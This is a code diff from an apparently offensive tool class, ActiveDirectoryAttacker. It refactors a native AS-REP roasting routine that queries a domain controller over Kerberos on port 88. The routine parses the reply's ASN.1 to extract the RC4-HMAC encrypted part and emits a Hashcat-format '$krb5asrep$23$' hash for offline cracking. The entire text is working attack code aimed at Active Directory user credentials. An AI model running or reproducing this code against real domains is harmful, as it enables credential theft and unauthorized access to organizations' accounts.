@@ -238,6 +238,66 @@ class ActiveDirectoryAttacker:
             "method": "native_packet" if not IMPACKET_AVAILABLE else "hybrid",
         }
 
+    def _extract_cipher_from_asn1(
+        self,
+        remaining: str,
+        match: "re.Match[str]",
+    ) -> str | None:
+        """Extract cipher hex from ASN.1 Octet String structure."""
+        cipher_start_idx = remaining.find("04", match.start())
+        if cipher_start_idx == -1:
+            return None
+
+        len_byte_hex = remaining[cipher_start_idx + 2 : cipher_start_idx + 4]
+        length = int(len_byte_hex, 16)
+
+        # If high bit set, it's long form
+        data_start = cipher_start_idx + 4
+        if length > 127:
+            # Decode number of bytes for length
+            len_bytes_count = length & 0x7F
+            len_hex = remaining[
+                cipher_start_idx + 4 : cipher_start_idx + 4 + (len_bytes_count * 2)
+            ]
+            length = int(len_hex, 16)
+            data_start = cipher_start_idx + 4 + (len_bytes_count * 2)
+
+        return remaining[data_start : data_start + (length * 2)]
+
+    def _parse_asrep_hash(
+        self,
+        resp: bytes,
+        user: str,
+        domain: str,
+    ) -> str | None:
+        """Parse AS-REP response and extract hash in Hashcat format."""
+        import binascii
+        import re
+
+        try:
+            hex_str = binascii.hexlify(resp).decode()
+
+            # Find EType 23 marks (RC4-HMAC)
+            if "a003020117" not in hex_str:
+                return None
+
+            etype_idx = hex_str.find("a003020117")
+            remaining = hex_str[etype_idx + 10 :]
+
+            # Find 'A2' tag (cipher wrapper)
+            match = re.search(r"a2([0-9a-f]{2,6})04([0-9a-f]{2,6})", remaining)
+            if not match:
+                return None
+
+            cipher_hex = self._extract_cipher_from_asn1(remaining, match)
+            if cipher_hex:
+                return f"$krb5asrep$23${user}@{domain}:{cipher_hex}"
+            return None
+
+        except Exception as e:
+            logger.debug("Hash extraction heuristic failed: %s", e)
+            return f"$krb5asrep$23${user}@{domain}:[MANUAL_EXTRACTION_REQUIRED_SIZE_{len(resp)}]"
+
     async def _native_roast(self, domain: str, user: str, dc_ip: str) -> str | None:
         """Native AS-REP Roasting without Impacket."""
         try:
@@ -251,9 +311,7 @@ class ActiveDirectoryAttacker:
             # Send (Async)
             await loop.sock_sendto(sock, packet, (dc_ip, 88))
 
-            # Receive with timeout logic since sock_recvfrom isn't standard in all loops or needs careful handling
-            # We use a simple select wrapper or just direct non-blocking try/except for this demo
-            # to remain compatible, we wrap blocking recv in executor
+            # Receive with timeout logic
             sock.setblocking(True)
             sock.settimeout(2.0)
 
@@ -266,102 +324,11 @@ class ActiveDirectoryAttacker:
             data_tuple = await loop.run_in_executor(None, receive)
             sock.close()
 
-            if (
-                data_tuple and len(data_tuple[0]) > 0 and data_tuple[0][0] == 0x6B
-            ):  # AS-REP (Application 11)
-                resp = data_tuple[0]
+            # Check for valid AS-REP (Application 11 = 0x6B)
+            if not data_tuple or len(data_tuple[0]) == 0 or data_tuple[0][0] != 0x6B:
+                return None
 
-                # Manual Minimalist ASN.1 Parser to find 'enc-part' -> 'cipher'
-                # Structure: AS-REP -> enc-part (PO-Sequence) -> cipher (Octet String)
-                # We look for the sequence specific to RC4-HMAC (etype 23)
-
-                try:
-                    # Heuristic: Find etype 23 (0x17) followed by cipher octet string
-                    # Pattern: A2 (tag) -> len -> 04 (OctetString) -> len -> CIPHER
-                    # But first we need to ensure it's etype 23.
-                    # Search for sequence: 30 (SEQ) -> A0 (tag) -> 02 (INT) -> 01 (len) -> 17 (val 23)
-
-                    import binascii
-
-                    hex_str = binascii.hexlify(resp).decode()
-
-                    # Find EType 23 marks
-                    # 30..a003020117 (Sequence -> Etype: 23) ... a2..04.. (Cipher)
-                    if "a003020117" in hex_str:
-                        # The cipher is in the following Octet String (04) inside tag (A2)
-                        # locate the etype
-                        etype_idx = hex_str.find("a003020117")
-
-                        # After etype, we usually have kvno (A1) or cipher directly (A2)
-                        # Let's search for the first OctetString (04) after the etype
-                        remaining = hex_str[etype_idx + 10 :]
-
-                        # Find 'A2' tag (cipher wrapper)
-                        # This is risky with regex but efficient for fixed struct
-                        import re
-
-                        # Look for A2 followed by length, then 04 followed by length
-                        # A2 .. 04 .. [CIPHER]
-                        # Using non-greedy match for the structure headers
-                        match = re.search(
-                            r"a2([0-9a-f]{2,6})04([0-9a-f]{2,6})",
-                            remaining,
-                        )
-
-                        if match:
-                            # Parse length of cipher
-                            # This is a bit rough, assuming short form length for simplicity or standard long form
-                            # Real robustness requires full ASN1, but for "Native Hack", we can grab the tail?
-                            # Actually, the cipher is usually the LAST big blob.
-
-                            # Let's just grab the content of the LAST Octet String in the packet
-                            # AS-REP structure usually ends with the encrypted part.
-
-                            # Valid approach: extract the blob from the match start to near end
-                            # Let's try to parse the length byte of the 04 tag
-                            cipher_start_idx = remaining.find("04", match.start())
-                            if cipher_start_idx != -1:
-                                len_byte_hex = remaining[
-                                    cipher_start_idx + 2 : cipher_start_idx + 4
-                                ]
-                                length = int(len_byte_hex, 16)
-
-                                # If high bit set, it's long form
-                                data_start = cipher_start_idx + 4
-                                if length > 127:
-                                    # Decode number of bytes for length
-                                    len_bytes_count = length & 0x7F
-                                    len_hex = remaining[
-                                        cipher_start_idx + 4 : cipher_start_idx
-                                        + 4
-                                        + (len_bytes_count * 2)
-                                    ]
-                                    length = int(len_hex, 16)
-                                    data_start = (
-                                        cipher_start_idx + 4 + (len_bytes_count * 2)
-                                    )
-
-                                cipher_hex = remaining[
-                                    data_start : data_start + (length * 2)
-                                ]
-
-                                # Construct Hashcat format
-                                # $krb5asrep$23$user@domain:hash_first_16_bytes$hash_remainder
-                                # Note: Hashcat format varies slightly.
-                                # Standard: $krb5asrep$23$client_name@realm:checksum$enc_data
-                                # The first 16 bytes of RC4 cipher are often the checksum?
-                                # Actually for etype 23, the cipher is simply the data concatenated?
-                                # Let's stick to the raw hex for the user to post-process if needed,
-                                # or standard format: $krb5asrep$23$user@domain:HEX
-
-                                return f"$krb5asrep$23${user}@{domain}:{cipher_hex}"
-
-                except Exception as e:
-                    logger.debug("Hash extraction heuristic failed: %s", e)
-                    # Fallback to simple success indicator
-                    return f"$krb5asrep$23${user}@{domain}:[MANUAL_EXTRACTION_REQUIRED_SIZE_{len(resp)}]"
-
-            return None
+            return self._parse_asrep_hash(data_tuple[0], user, domain)
 
         except Exception:
             return None
